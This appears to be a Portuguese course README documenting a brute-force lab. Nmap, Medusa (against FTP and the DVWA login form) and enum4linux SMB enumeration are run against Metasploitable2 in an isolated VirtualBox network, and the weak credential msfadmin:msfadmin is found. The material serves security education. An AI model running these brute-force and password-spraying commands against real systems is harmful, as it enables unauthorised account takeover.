# bruteforceDIO
Simulando ataques brute force (ethical hacking)

🛡️ Laboratório de Testes de Autenticação com Kali Linux
📚 Sobre o Curso

Durante o curso foi possível analisar diversas ferramentas presentes no Kali Linux, entendendo seu funcionamento em ambiente controlado.

🔧 Ferramentas Estudadas

Hydra → Ataques a serviços de autenticação em diversas portas.

Ncrack → Testes de autenticação em serviços de rede (menos eficaz para aplicações web).

John the Ripper → Quebra de hashes e arquivos protegidos (uso exclusivamente offline).

WPScan → Scanner específico para aplicações WordPress.

Patator → Framework avançado para força bruta em mecanismos de autenticação (indicado para usuários mais experientes).

Medusa → Ferramenta de brute force simples e eficiente (mais utilizada durante o curso).

🖥️ Ambiente de Laboratório

Foram utilizadas duas máquinas virtuais no Oracle VirtualBox:

1 VM com Kali Linux

1 VM com Metasploitable2 (sistema propositalmente vulnerável para fins educacionais)

🔒 Ambas configuradas em modo Host-Only, garantindo ambiente isolado e seguro para estudo.

🔎 Enumeração Inicial com Nmap

Ferramenta utilizada:

nmap -sV -p 21,22,80,445,139 IP_ALVO
📌 Portas analisadas:

21 → FTP

22 → SSH

80 → HTTP

445 → SMB

139 → NetBIOS

🔎 Explicação:

-sV → Detecta a versão dos serviços em execução

-p → Define as portas a serem escaneadas

O objetivo é identificar quais portas estão abertas e quais serviços estão rodando.

📂 Teste de Autenticação – Serviço FTP (Ambiente Controlado)
🔌 Conexão Manual
ftp IP_ALVO

Se bem-sucedido:

Connected to IP_ALVO

O sistema solicitará:

Username

Password

Como as credenciais não são conhecidas, foi realizado teste automatizado em laboratório.

📝 Criação de Wordlists
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "1234\npassword\nqwerty\nmsfadmin" > pass.txt

Arquivos salvos no diretório /home do Kali Linux.

⚙️ Execução com Medusa
medusa -h IP_ALVO -U users.txt -P pass.txt -M ftp -t 6
🔎 Parâmetros:

-h → Host alvo

-U → Lista de usuários

-P → Lista de senhas

-M ftp → Módulo FTP

-t 6 → 6 conexões simultâneas

📊 Resultado

No laboratório foi encontrada a credencial:

msfadmin : msfadmin

⚠️ Demonstra vulnerabilidade por uso de senha fraca.

🌐 Teste de Autenticação – Aplicação Web (DVWA)

Aplicação utilizada:

🐞 DVWA (Damn Vulnerable Web Application)

Acesso:

http://IP_ALVO/dvwa/login.php
🔍 Análise do Formulário

Abrir navegador

Pressionar F12 (DevTools)

Ir até a aba Network

Observar requisição enviada no login

Identificar:

Método → POST

Parâmetros → username e password

Mensagem de erro retornada

📝 Criação das Wordlists
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
⚙️ Execução HTTP com Medusa
medusa -h IP_ALVO -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
🔎 Explicação:

PAGE → Página alvo

FORM → Estrutura dos parâmetros enviados

FAIL → Mensagem que indica tentativa inválida

-t 6 → Número de conexões simultâneas

📊 Resultado

Se retornar SUCCESS, significa que uma combinação válida foi encontrada.

Recomenda-se validar manualmente no navegador.

🖧 Enumeração SMB + Password Spraying
📡 Protocolo

SMB (Server Message Block)

🔎 Enumeração com enum4linux
enum4linux -a IP_ALVO | tee enum4_output.txt

Analisar resultado:

less enum4_output.txt

Durante o teste foram identificados possíveis usuários:

games
nobody
bind

Esses usuários podem ser utilizados posteriormente em testes controlados de password spraying.

Minhas considerações finais:
No Curso aprendi muitas ferramentas e muitas formas de ataques brute force , foi muito produtivo para meus estudos de CyberSecurity e sempre penso e também aconselho outras pessoas que pensam em estudar Cyber para sempre colocar como primeiro requisito a segurança e sempre usar esses conhecimentos da maneira mais correta possivel , sempre pensando na sua ética profissional , LGPD entre outros . 
